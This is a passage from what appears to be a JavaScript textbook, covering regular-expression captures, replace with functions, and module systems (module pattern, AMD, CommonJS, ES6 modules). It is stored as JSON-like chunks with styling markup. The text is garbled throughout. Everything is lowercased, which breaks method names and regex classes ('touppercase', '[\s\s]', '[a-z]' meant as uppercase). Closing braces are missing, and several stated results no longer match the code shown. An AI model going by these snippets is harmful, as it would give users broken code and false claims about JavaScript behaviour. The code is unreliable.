!@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we define an element that specifies the style that will translate its position by 15 px:  \"transform:translatey(15px);\"  unfortunately, the browser doesn't offer an api for easily fetching the amount by which the element is translated. so we create our own function:  function gettranslatey(elem){  const transformvalue = elem.style.transform;  if(transformvalue){  const match = transformvalue.match(/translatey\\(([^\\)]+)\\)/);  return match ? match[1] : \"\";  return \"\";  the transform parsing code may seem confusing at first:  const match = transformvalue.match(/translatey\\(([^\\)]+)\\)/);  return match ? match[1] : \"\";", "javascript-10.4.txt__3": "the array returned by match includes the entire match in the first index, and then each subsequent capture following. so the zeroth entry would be the entire matched string of translatey(15px), and the entry at the next position would be 15px.", "javascript-10.4.txt__4": "this example uses a local regular expression and the match method. things change when we use global expressions. let's see how.  10.4.2. matching using global expressions  as we saw in the previous section, using a local regular expression (one without the global flag) with the string object's match methods returns an array containing the entire matched string, along with any matched captures in the operation.", "javascript-10.4.txt__5": "we can see this in action in the following code and tests.  listing 10.5. differences between global and local searches with match  const html = \"<div class='test'><b>hello</b> <i>world!</i></div>\";  const results = html.match(/<(\\/?)(\\w+)([^>]*?)>/);  #a  assert(results[0] === \"<div class='test'>\", \"the entire match.\");  assert(results[1] === \"\", \"the (missing) slash.\");  assert(results[2] === \"div\", \"the tag name.\");  assert(results[3] === \" class='test'\", \"the attributes.\");  const all = html.match(/<(\\/?)(\\w+)([^>]*?)>/g);  #b  assert(all[0] === \"<div class='test'>\", \"opening div tag.\");  assert(all[1] === \"<b>\", \"opening b tag.\");  assert(all[2] === \"</b>\", \"closing b tag.\");  assert(all[3] === \"<i>\", \"opening i tag.\");  assert(all[4] === \"</i>\", \"closing i tag.\");  assert(all[5] === \"</div>\", \"closing div tag.\");  #a - matches using a local regex  #b - matches using a global regex  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we can see that when we do a local match, html.match(/<(\\/?)(\\w+)([^>]*?)>/), a single instance is matched and the captures within that match are also returned. but when we use a global match, html.match(/<(\\/?)(\\w+)([^>]*?)>/g), what's returned is the list of matches.", "javascript-10.4.txt__6": "listing 10.6. using the exec method to do both capturing and a global search  const html = \"<div class='test'><b>hello</b> <i>world!</i></div>\";  const tag = /<(\\/?)(\\w+)([^>]*?)>/g;  let match, num = 0;  while ((match = tag.exec(html)) !== null) {  #a  assert(match.length === 4,  \"every match finds each tag and 3 captures.\");  num++;  assert(num === 6, \"3 opening and 3 closing tags found.\");  #a - repeatedly calls exec  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":10,\\\"ch\\\":0},{\\\"line\\\":10,\\\"ch\\\":26}]]\"}  !@%style%@!  in this example, we repeatedly call the exec method:  while ((match = tag.exec(html)) !== null) {...}  this retains state from the previous invocation so that each subsequent call progresses to the next global match. each call returns the next match and its captures.  by using either match or exec, we can always find the exact matches (and captures) that we're looking for. but we'll need to dig further if we want to refer to the captures themselves within the regex.  10.4.3. referencing captures", "javascript-10.4.txt__7": "listing 10.7. using backreferences to match the contents of an html tag  const html = \"<b class='hello'>hello</b> <i>world!</i>\";  const pattern = /<(\\w+)([^>]*)>(.*?)<\\/\\1>/g;  #a  let match = pattern.exec(html);  #b  assert(match[0] === \"<b class='hello'>hello</b>\",  #c  \"the entire tag, start to finish.\");  assert(match[1] === \"b\", \"the tag name.\");  assert(match[2] === \" class='hello'\", \"the tag attributes.\");  assert(match[3] === \"hello\", \"the contents of the tag.\");  match = pattern.exec(html);  assert(match[0] === \"<i>world!</i>\",  \"the entire tag, start to finish.\");  assert(match[1] === \"i\", \"the tag name.\");  assert(match[2] === \"\", \"the tag attributes.\");  assert(match[3] === \"world!\", \"the contents of the tag.\");  #a - uses capture backreference  #b - runs the pattern on the test string  #c - tests various captures that are captured by the defined pattern  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-10.4.txt__8": "additionally, we can get capture references within the replace string of a call to the replace method. instead of using the backreference codes, as in listing 10.7, we use the syntax of $1, $2, $3, up through each capture number. here's an example:  assert(\"fontfamily\".replace(/([a-z])/g, \"-$1\").tolowercase() ===  \"font-family\", \"convert the camelcase into dashed notation.\");  in this code, the value of the first capture (in this case, the capital letter f) is referenced in the replace string (via $1). this allows us to specify a replace string without even knowing what its value will be until matching time. that's a powerful ninja-esque weapon to wield.  the ability to reference regular-expression captures helps make a lot of code that would otherwise be difficult, quite easy. the expressive nature that it provides ends up allowing for some terse statements that could otherwise be rather obtuse, convoluted, and lengthy.", "javascript-10.4.txt__9": "10.4.4. noncapturing groups", "javascript-10.4.txt__10": "consider the following regex:  const pattern = /((ninja-)+)sword/;  here, the intent is to create a regex that allows the prefix ninja- to appear one or more times before the word sword, and we want to capture the entire prefix. this regex requires two sets of parentheses:  the parentheses that define the capture (everything before the string sword)  the parentheses that group the text ninja- for the + operator  this all works fine, but it results in more than the single intended capture because of the inner set of grouping parentheses.  to indicate that a set of parentheses shouldn't result in a capture, the regular expression syntax lets us put the notation ?: immediately after the opening parenthesis. this is known as a passive subexpression.  changing this regular expression to  const pattern = /((?:ninja-)+)sword/;  causes only the outer set of parentheses to create a capture. the inner parentheses have been converted to a passive subexpression.  to test this, take a look at the following code.  listing 10.8. grouping without capturing  const pattern = /((?:ninja-)+)sword/;  #a  const ninjas = \"ninja-ninja-sword\".match(pattern);  assert(ninjas.length === 2,\"only one capture was returned.\");  assert(ninjas[1] === \"ninja-ninja-\",  \"matched both words, without any extra capture.\");  #a - uses a passive subexpression  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":7,\\\"ch\\\":0},{\\\"line\\\":7,\\\"ch\\\":33}]]\"}  !@%style%@!  running these tests, we can see that the passive subexpression /((?:ninja-)+)sword/ prevents unnecessary captures.", "javascript-10.5.txt__1": "10.5. replacing using functions", "javascript-10.5.txt__2": "for example, let's say that we want to replace all uppercase characters in a string with x. we could write the following:  \"abcdefg\".replace(/[a-z]/g,\"x\")  this results in a value of xxxxxfg. nice.  but perhaps the most powerful feature presented by replace is the ability to provide a function as the replacement value rather than a fixed string.  when the replacement value (the second argument) is a function, it's invoked for each match found (remember that a global search will match all instances of the pattern in the source string) with a variable list of parameters:  the full text of the match  the captures of the match, one parameter for each  the index of the match within the original string  the source string  the value returned from the function serves as the replacement value.", "javascript-10.5.txt__3": "listing 10.9. converting a dashed string to camel case  function upper(all,letter) { return letter.touppercase(); }  #a  assert(\"border-bottom-width\".replace(/-(\\w)/g,upper)  #b  === \"borderbottomwidth\",  \"camel cased a hyphenated string.\");  #a - converts to uppercase  #b - matches dashed characters  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-10.5.txt__4": "the first time the function is called, it's passed -b and b; and the second time it's called, it's passed -w and w. in each case, the captured letter is uppercased and returned as the replacement string. we end up with -b replaced by b and with -w replaced by w.", "javascript-10.5.txt__5": "for example, let's say that we're looking to take a query string and convert it to an alternative format that suits our purposes. we'd turn a query string such as  foo=1&foo=2&blah=a&blah=b&foo=3  into one that looks like this  foo=1,2,3&blah=a,b\"  a solution using regular expressions and replace could result in some especially terse code, as shown in the next listing.  listing 10.10. a technique for compressing a query string  function compress(source) {  const keys = {};  #a  source.replace(  /([^=&]+)=([^&]*)/g,  function(full, key, value) {  #b  keys[key] =  (keys[key] ? keys[key] + \",\" : \"\") + value;  return \"\";  );  const result = [];  #c  for (let key in keys) {  #c  result.push(key + \"=\" + keys[key]);  #c  #c  return result.join(\"&\");  #d  assert(compress(\"foo=1&foo=2&blah=a&blah=b&foo=3\") ===  \"foo=1,2,3&blah=a,b\",  \"compression is ok!\");  #a - stores located keys  #b - extracts key-value info  #c - collects key info  #d - joins results with &  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-10.5.txt__6": "the example code first declares a hash key in which we store the keys and values that we find in the source query string. then we call the replace method on the source string, passing a regex that will match the key-value pairs, and capture the key and the value. we also pass a function that will be passed the full match, the key capture, and the value capture. these captured values get stored in the hash for later reference. note that we return the empty string because we don't care what substitutions happen to the source string\u2014we're just using the side effects rather than the result.", "javascript-10.5.txt__7": "after replace returns, we declare an array in which we'll aggregate the results and iterate through the keys that we found, adding each to the array. finally, we join each of the results we stored in the array by using & as the delimiter, and we return the result:  const result = [];  for (let key in keys) {  result.push(key + \"=\" + keys[key]);  return result.join(\"&\");", "javascript-10.6.txt__1": "10.6. solving common problems with regular expressions  in javascript, a few idioms tend to occur again and again, but their solutions aren't always obvious. a knowledge of regular expressions can definitely come to the rescue, and in this section we'll look at a few common problems that we can solve with a regex or two.  10.6.1. matching newlines", "javascript-10.6.txt__2": "let's look at a couple of ways of getting around this omission in javascript, as shown in the next listing.  listing 10.11. matching all characters, including newlines  const html = \"<b>hello</b>\\n<i>world!</i>\";  #a  assert(/.*/.exec(html)[0] === \"<b>hello</b>\",  #b  \"a normal capture doesn't handle endlines.\");  assert(/[\\s\\s]*/.exec(html)[0] ===  #c  \"<b>hello</b>\\n<i>world!</i>\",  #c  \"matching everything with a character set.\");  #c  assert(/(?:.|\\s)*/.exec(html)[0] ===  #d  \"<b>hello</b>\\n<i>world!</i>\",  #d  \"using a non-capturing group to match everything.\");  #d  #a - defines a test subject  #b - shows that newlines aren't matched  #c - matches all using whitespace matching  #d - matches all using alteration  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  this example defines a test subject string: \"<b>hello</b>\\n<i>world!</i>\", containing a newline. then we try various ways of matching all the characters in the string.", "javascript-10.6.txt__3": "another approach is taken in the next test:  /[\\s\\s]*/.exec(html)[0] === \"<b>hello</b>\\n<i>world!</i>\"", "javascript-10.6.txt__4": "next, let's take a step to widen our view to a worldwide scope.  10.6.2. matching unicode  frequently in the use of regular expressions, we want to match alphanumeric characters, such as an id selector in a css selector engine implementation. but assuming that the alphabetic characters will be from only the set of english ascii characters is shortsighted.  expanding the set to include unicode characters is sometimes desirable, explicitly supporting multiple languages not covered by the traditional alphanumeric character set (see the following listing).  listing 10.12. matching unicode characters  const text =\"\\u5fcd\\u8005\\u30d1\\u30ef\\u30fc\";  const matchall = /[\\w\\u0080-\\uffff_-]+/;  #a  assert(text.match(matchall),\"our regexp matches non-ascii!\");  #a - matches all, including unicode  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":0},{\\\"line\\\":4,\\\"ch\\\":35}]]\"}  !@%style%@!", "javascript-10.6.txt__5": "the astute among you might note that by adding the entire range of unicode characters above \\u0080, we match not only alphabetic characters, but also all unicode punctuation and other special characters (arrows, for example). but that's okay, because the point of the example is to show how to match unicode characters in general. if you have a specific range of characters that you want to match, you can use the lesson of this example to add whatever range you wish to the character class.", "javascript-10.6.txt__6": "before moving on from our examination of regular expressions, let's tackle one more common issue.  10.6.3. matching escaped characters", "javascript-10.6.txt__7": "a library developer, when writing an implementation for, say, a css selector engine, would like to support escaped characters. this allows the user to specify complex names that don't conform to typical naming conventions. so let's develop a regex that will allow matching escaped characters. consider the following code.", "javascript-10.7.txt__1": "10.7. summary", "javascript-10.7.txt__2": "we can create regular expressions with regular expression literals (/test/) and with the regexp constructor (new regexp(\"test\")). literals are preferred when the regex is known at development time, and the constructor when the regex is constructed at runtime.", "javascript-11.1.txt__1": "11.1. modularizing code in pre-es6 javascript", "javascript-11.1.txt__2": "when deciding which features to use, we have to keep in mind that, at a bare minimum, each module system should be able to do the following:  define an interface through which we can access the functionality offered by the module.", "javascript-11.1.txt__3": "in this section, we'll first see how to create modules by using standard javascript features that we've explored so far in the book, features such as objects, closures, and immediate functions. we'll continue this modularization vein by exploring asynchronous module definition (amd) and commonjs, the two most popular module specification standards, built on slightly different foundations. you'll learn how to define modules using these standards, as well as their pros and cons.", "javascript-11.1.txt__4": "but let's start with something for which we've already set the stage in previous chapters.  11.1.1. using objects, closures, and immediate functions to specify modules  let's go back to our minimal module system requirements, hiding implementation details and defining module interfaces. now think about which javascript language features we can take advantage of in order to implement these minimal requirements:", "javascript-11.1.txt__5": "defining module interfaces\u2014 implementing module internals through function variables means that those variables are accessible from only within the module. but if our modules are to be used from other code, we have to be able to define a clean interface through which we can expose the functionality offered by the module. one way of achieving this is by taking advantage of objects and closures. the idea is that, from our function module, we return an object that represents the public interface of our module. that object should contain methods offered by the module, methods that will, through closures, keep alive our internal module variables, even after our module function has finished its execution.", "javascript-11.1.txt__6": "now that we've given a high-level description of how to implement modules in javascript, let's go through it slowly, step by step, starting with using functions for hiding module internals.  functions as modules  calling a function creates a new scope that we can use to define variables that won't be visible from outside the current function. let's take a look at the following code snippet that counts the number of clicks on a web page:  (function countclicks(){  let numclicks = 0;  #a  document.addeventlistener(\"click\", () => {  alert( ++numclicks );  #b  });  })();  #a - defines a local variable that will store click counts  #b - whenever a user clicks, the counter is incremented and the current value reported.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-11.1.txt__7": "the numclicks variable, internal to the countclicks function, is kept alive through the closure of the click handler function. the variable can be referenced only within the handler, and nowhere else! we've shielded the numclicks variable from the code outside the countclicks function. at the same time, we haven't polluted the global namespace of our program with a variable that's probably not that important for the rest of our code.", "javascript-11.1.txt__8": "our countclicks function is called only in this one place, so instead of defining a function and then calling it in a separate statement, we've used an immediate function, or an iife (presented in chapter 3), to define and immediately invoke the countclicks function.  we can also take a look at the current application state, with respect to how our internal function (or module) variable is kept alive through closures, as shown in figure 11.1.  figure 11.1. the click event handler, through closures, keeps alive the local numclicks variable.  now that we understand how to hide internal module details, and how closures can keep those internal details alive as long as necessary, let's move on to our second minimal requirement for modules: defining module interfaces.  the module pattern: augmenting functions as modules with objects as interfaces  the module interface is usually composed of a set of variables and functions that our module provides to the outside world. the easiest way to create such an interface is to use the humble javascript object.  for example, let's create an interface for our module that counts the clicks on our web page, as shown in the following listing.  listing 11.1. the module pattern  const mousecountermodule = function() {  #a  let numclicks = 0;  #b  const handleclick = () => {  #c  alert(++numclicks);  #c  };  #c  return {  #d  countclicks: () => {  #d  document.addeventlistener(\"click\", handleclick);  #d  #d  };  #d  }();  assert(typeof mousecountermodule.countclicks === \"function\",  #e  \"we can access module functionality\");  #e  assert(typeof mousecountermodule.numclicks === \"undefined\"  #f  && typeof mousecountermodule.handleclick === \"undefined\" ,  #f  \"we cannot access internal module details\");  #f  #a - creates a global module variable and assigns the result of immediately invoking a function  #b - creates a \u201cprivate\u201d module variable  #c - creates a \u201cprivate\u201d module function  #d - returns an object that represents the module's interface. through closures, we can access \u201cprivate\u201d module variables and functions.  #e - from outside, we can access the properties exposed through the interface.  #f - but we can't access module internals.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-11.1.txt__9": "at the same time, because we've exposed a module interface, our internal module details are kept alive through closures created by the interface. for example, in this case, the countclicks method of the interface keeps alive internal module variables numclicks and handleclick, as shown in figure 11.2.", "javascript-11.1.txt__10": "figure 11.2. expose the public interface of a module through a returned object. the internal module implementation (\u201cprivate\u201d variables and functions) is kept alive through closures created by public interface methods.  finally, we store the object that represents the module interface, returned by the immediate function, into a variable named mousecountermodule, through which we can easily consume module functionality, by writing the following code:  mousecountermodule.countclicks()  and that's basically it.  by taking advantage of immediate functions, we can hide certain module implementation details. then by adding objects and closures into the mix, we can specify a module interface that exposes the functionality provided by our module to the outside world.  this pattern of using immediate functions, objects, and closures to create modules in javascript is called the module pattern. it was popularized by douglas crockford, and was one of the first massively popular ways of modularizing javascript code.  once we have the ability to define modules, it's always nice to be able to split them across multiple files (in order to more easily manage them), or to be able to define additional functionality on existing modules, without modifying their source code.  let's see how this can be done.  augmenting modules  let's augment our mousecountermodule from the previous example with an additional feature of counting the number of mouse scrolls, but without modifying the original mousecountermodule code. see the following listing.  listing 11.2. augmenting modules  const mousecountermodule = function(){  #a  let numclicks = 0;  const handleclick = () => {  alert(++numclicks);  };  return {  countclicks: () => {  document.addeventlistener(\"click\", handleclick);  };  }();  (function(module) {  #b  let numscrolls = 0;  #c  const handlescroll = () => {  #c  alert(++numscrolls);  #c  #c  module.countscrolls = () => {  #d  document.addeventlistener(\"wheel\", handlescroll);  #d  };  #d  })(mousecountermodule);  #e  assert(typeof mousecountermodule.countclicks === \"function\",  \"we can access initial module functionality\");  assert(typeof mousecountermodule.countscrolls === \"function\",  \"we can access augmented module functionality\");  #a - the original mousecountermodule  #b - immediately invokes a function that accepts the module we want to extend as an argument  #c - defines new private variables and functions  #d - extends the module interface  #e - passes in the module as an argument  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  when augmenting a module, we usually follow a procedure similar to creating a new module. we immediately call a function, but this time, we pass to it the module we want to extend as an argument:  (function(module){  ...  return module;  })(mousecountermodule);  within the function, we then go about our work and create all the necessary private variables and functions. in this case, we've defined a private variable and a private function for counting and reporting the number of scrolls:  let numscrolls = 0;  const handlescroll = () => {  alert(++numscrolls);  finally, we extend our module, available through the immediate function's module parameter, just as we would extend any other object:  module.countscrolls = ()=> {  document.addeventlistener(\"wheel\", handlescroll);  };  after we've performed this simple operation, our mousecountermodule can also countscrolls.  our public module interface now has two methods, and we can use the module in the following ways:  mousecountermodule.countclicks();  #a  mousecountermodule.countscrolls();  #b  #a - a method that's part of the module's interface from the beginning  #b - a new module method that we've added by extending the module  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-11.1.txt__11": "figure 11.3. when augmenting a module, we extend its external interface with new functionality, usually by passing the module to another immediate function. in this example, we add the ability to countscrolls to our mousecountermodule. notice that two separate functions are defined in different environments, and they can't access each other's internal variables.", "javascript-11.1.txt__12": "if you look closely, figure 11.3 also shows one of the shortcomings of the module pattern: the inability to share private module variables across module extensions. for example, the countclicks function keeps a closure around the numclicks and handleclick variables, and we could access these private module internals through the countclicks method.", "javascript-11.1.txt__13": "unfortunately, our extension, the countscrolls function, is created in a completely separate scope, with a completely new set of private variables: numscrolls and handlescroll. the countscrolls function creates a closure only around numscrolls and handlescroll variables, and therefore can't access the numclicks and handleclick variables.", "javascript-11.1.txt__14": "note", "javascript-11.1.txt__15": "note that, in the module pattern, modules are objects just like any other, and we can extend them in any way we find appropriate. for example, we can add new functionality by extending the module object with new properties:  mousecountermodule.newmethod = ()=> {...}  we can also use the same principle to easily create submodules:  mousecountermodule.newsubmodule = () => {  return {...};  }();  notice that all of these approaches suffer from the same fundamental shortcoming of the module pattern: subsequent extensions of the module can't access previously defined internal module details.", "javascript-11.1.txt__16": "to deal with these issues, a couple of competing standards have arisen, namely asynchronous module definition (amd) and commonjs.  11.1.2. modularizing javascript applications with amd and commonjs", "javascript-11.1.txt__17": "amd", "javascript-11.1.txt__18": "let's see an example of defining a small module that has a dependency to jquery.  listing 11.3. using amd to specify a module dependent on jquery  define('mousecountermodule',['jquery'], $ => {  #a  let numclicks = 0;  const handleclick = () => {  alert(++numclicks);  };  return {  #b  countclicks: () => {  $(document).on(\"click\", handleclick);  };  });  #a - uses the define function to specify a module, its dependencies, and the module factory function that will create the module  #b - the public interface of our module  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":6}],[{\\\"line\\\":13,\\\"ch\\\":14},{\\\"line\\\":13,\\\"ch\\\":20}]]\"}  !@%style%@!  amd provides a function called define that accepts the following:  the id of the newly created module. this id can later be used to require the module from other parts of our system.  a list of module ids on which our current module depends (the required modules).  a factory function that will initialize the module and that accepts the required modules as arguments.", "javascript-11.1.txt__19": "as you can see, amd offers several interesting benefits, such as these:  automatic resolving of dependencies, so that we don't have to think about the order in which we include our modules.  modules can by asynchronously loaded, thereby avoiding blocking.  multiple modules can be defined within one file.  now that you have the basic idea of how amd works, let's take a look at another, massively popular module definition standard.  commonjs  whereas amd was built explicitly for the browser, commonjs is a module specification designed for a general-purpose javascript environment. currently it has the biggest following in the node.js community.  commonjs uses file-based modules, so we can specify one module per file. to each module, commonjs exposes a variable, module, with a property, exports, which we can easily extend with additional properties. in the end, the content of module.exports is exposed as the module's public interface.", "javascript-11.1.txt__20": "let's look at an example that defines our reoccurring mousecountermodule, this time in commonjs.  listing 11.4. using commonjs to define a module  //mousecountermodule.js  const $ = require(\"jquery\");  #a  let numclicks = 0;  const handleclick = () => {  alert(++numclicks);  };  module.exports = {  #b  countclicks: () => {  $(document).on(\"click\", handleclick);  };  #a - synchronously requires a jquery module  #b - modifies the module.exports property to specify the public interface of a module  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  to include our module within a different file, we can write this:  const mousecountermodule = require(\"mousecountermodule.js\");  mousecountermodule.countclicks();  see how simple this is?", "javascript-11.1.txt__21": "once again, it's important to note that only variables and functions exposed through the module.exports object are available from outside the module. the procedure is similar to the module pattern, only instead of returning a completely new object, the environment already provides one that we can extend with our interface methods and properties.", "javascript-11.1.txt__22": "commonjs has a couple of advantages:  it has simple syntax. we need to specify only the module.exports properties, while the rest of the module code stays pretty much the same as if we were writing standard javascript. requiring modules is also simple; we just use the require function.  commonjs is the default module format for node.js, so we have access to thousands of packages that are available through npm, node's package manager.", "javascript-11.1.txt__23": "having two competing standards for specifying modules, amd and commonjs, has led to one of those situations in which people tend to divide themselves into two, sometimes even opposing, camps. if you work on relatively closed projects, this might not be an issue; you choose the standard that suits you better. problems can arise, however, when we need to reuse code from the opposing camp and are forced to jump through all sorts of hoops. one solution is to use universal module definition, or umd (https://github.com/umdjs/umd), a pattern with a somewhat convoluted syntax that allows the same file to be used by both amd and commonjs. this is beyond the scope of this book, but if you're interested, many quality resources are available online.", "javascript-11.2.txt__1": "11.2. es6 modules  es6 modules are designed to marry the advantages of commonjs and amd:  similar to commonjs, es6 modules have a relatively simple syntax, and es6 modules are file based (one module per file).  similar to amd, es6 modules provide support for asynchronous module loading.  note", "javascript-11.2.txt__2": "the main idea behind es6 modules is that only the identifiers explicitly exported from a module are accessible from outside that module. all other identifiers, even the ones defined in top-level scope (what would be global scope in standard javascript), are accessible only from within the module. this was inspired by commonjs.", "javascript-11.2.txt__3": "to provide this functionality, es6 introduces two new keywords:  export\u2014for making certain identifiers available from outside the module  import\u2014for importing exported module identifiers  the syntax for exporting and importing module functionality is simple, but it has a lot of subtle nuances that we'll explore slowly, step by step.  11.2.1. exporting and importing functionality  let's start with a simple example that shows how to export functionality from one module and import it into another.  listing 11.5. exporting from a ninja.js module  const ninja = \"yoshi\";  #a  export const message = \"hello\";  #b  #b  export function sayhitoninja() {  #b  return message + \" \" + ninja;  #c  #a - defines a top-level variable in a module  #b - defines a variable and a function, and exports them from the module with the export keyword  #c - accesses an inner module variable from the module's public api  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we first define a variable, ninja, a module variable that will be accessible only within this module, even though it's placed in top-level code (which would make it a global variable in pre-es6 code).  next, we define another top-level variable, message, which we make accessible from outside the module by using the new export keyword. finally, we also create and export the sayhitoninja function.", "javascript-11.2.txt__4": "before learning how to import this exported functionality, we'll take a look at an alternative way to export identifiers: we list everything we want to export at the end of the module, as shown in the following listing.  listing 11.6. exporting at the end of a module  const ninja = \"yoshi\";  #a  const message = \"hello\";  #a  function sayhitoninja() {  #b  return message + \" \" + ninja;  #b  #b  #b  export { message, sayhitoninja };  #b  #a - specifies all module identifiers  #b - exports some of the module identifiers  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":7,\\\"ch\\\":0},{\\\"line\\\":7,\\\"ch\\\":33}]]\"}  !@%style%@!  this way of exporting module identifiers bears some resemblance to the module pattern, as an immediate function returns an object that represents the public interface of our module, and especially to commonjs, as we expand the module.exports object with the public module interface.  regardless of how we've exported identifiers of a certain module, if we need to import them into another module, we have to use the import keyword, as in the following example.  listing 11.7. importing from the ninja.js module  import { message, sayhitoninja} from \"ninja.js\";  #a  assert(message === \"hello\",  #b  \"we can access the imported variable\");  #b  assert(sayhitoninja() === \"hello yoshi\",  #b  \"we can say hi to yoshi from outside the module\");  #b  assert(typeof ninja === \"undefined\",  #c  \"but we cannot access yoshi directly\");  #c  #a - uses the import keyword to import an identifier binding from a module  #b - we can now access the imported variable and call the imported function.  #c - we can't access not-exported module variables directly.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":48}]]\"}  !@%style%@!  we use the new import keyword to import a variable, message and a function, sayhitoninja from the ninja module:  import { message, sayhitoninja} from \"ninja.js\";  by doing this, we've gained access to these two identifiers defined in the ninja module. finally, we can test that we can access the message variable and call the sayhitoninja function:  assert(message === \"hello\",  \"we can access the imported variable\");  assert(sayhitoninja() === \"hello yoshi\",  \"we can say hi to yoshi from outside the module\");  what we can't do is access the nonexported and nonimported variables. for example, we can't access the ninja variable because it isn't marked with export:  assert(typeof ninja === \"undefined\",  \"but we cannot access yoshi directly\");  with modules, we're finally a bit safer from the misuse of global variables. everything that we didn't explicitly mark for export stays nicely isolated within a module.", "javascript-11.2.txt__5": "listing 11.8. importing all named exports from the ninja.js module  import * as ninjamodule from \"ninja.js\";  #a  assert(ninjamodule.message === \"hello\",  #b  \"we can access the imported variable\");  #b  assert(ninjamodule.sayhitoninja() === \"hello yoshi\",  #b  \"we can say hi to yoshi from outside the module\");  #b  assert(typeof ninjamodule.ninja === \"undefined\",  #c  \"but we cannot access yoshi directly\");  #c  #a - uses * notation to import all exported identifiers  #b - refers to the named exports through property notation  #c - we still can't access not-exported identifiers.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-11.2.txt__6": "default exports  often we don't want to export a set of related identifiers from a module, but instead want to represent the whole module through a single export. one fairly common situation in which this occurs is when our modules contain a single class, as in the following listing.  listing 11.9. a default export from ninja.js  export default class ninja {  #a  constructor(name){  this.name = name;  export function compareninjas(ninja1, ninja2){  #b  return ninja1.name === ninja2.name;  #a - uses the export default keywords to specify the default module binding  #b - we can still use named exports along with the default export.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":14}],[{\\\"line\\\":10,\\\"ch\\\":14},{\\\"line\\\":10,\\\"ch\\\":28}]]\"}  !@%style%@!", "javascript-11.2.txt__7": "now, we can use simplified syntax to import functionalities from ninja.js, as shown in the following listing.  listing 11.10. importing a default export  import importedninja from \"ninja.js\";  #a  import {compareninjas} from \"ninja.js\";  #b  const ninja1 = new importedninja(\"yoshi\");  #c  const ninja2 = new importedninja(\"hattori\");  #c  #c  assert(ninja1 !== undefined  #c  && ninja2 !== undefined, \"we can create a couple of ninjas\");  #c  assert(!compareninjas(ninja1, ninja2),  #d  \"we can compare ninjas\");  #d  #a - when importing a default export, there's no need for braces, and we can use whatever name we want.  #b - we can still import named exports.  #c - creates a couple of ninjas, and tests that they exist  #d - we can also access the named exports.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":37}]]\"}  !@%style%@!", "javascript-11.2.txt__8": "we continue the example by importing a named export, as in previous examples, just to illustrate that we can have both a default export and a number of named exports within a single module. finally, we instantiate a couple of ninja objects and call the compareninjas function, to confirm that all imports work as they should.", "javascript-11.2.txt__9": "in this case, both imports are made from the same file. es6 offers a shorthand syntax:  import importedninja, {compareninjas} from \"ninja.js\";  here we use the comma operator to import both the default and the named exports from the ninja.js file, in a single statement.  renaming exports and imports  if necessary, we can also rename both exports and imports. let's start with renaming exports, as shown in the following code (the comments indicate in which file the code is located):  //************* greetings.js ************/  function sayhi(){  #a  return \"hello\";  assert(typeof sayhi === \"function\"  #b  && typeof sayhello === \"undefined\",  #b  \"within the module we can access only sayhi\");  #b  export { sayhi as sayhello }  #c  //*************  main.js *****************/  import {sayhello } from \"greetings.js\";  #d  #d  assert(typeof sayhi === \"undefined\"  #d  && typeof sayhello === \"function\",  #d  \"when importing, we can only access the alias\");  #d  #a - defines a function called sayhi  #b - tests that we can access only the sayhi function, but not the alias!  #c - provides an identifier alias with the as keyword  #d - when importing, only the sayhello alias is available.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":9,\\\"ch\\\":9},{\\\"line\\\":9,\\\"ch\\\":26}]]\"}  !@%style%@!  in the previous example, we define a function called sayhi, and we test that we can access the function only though the sayhi identifier, and not through the sayhello alias that we provide at the end of the module through the as keyword:  export { sayhi as sayhello }  we can perform an export rename only in this export form, and not by prefixing the variable or function declaration with the export keyword.  then, when we perform an import of the renamed export, we reference the import through the given alias:  import { sayhello } 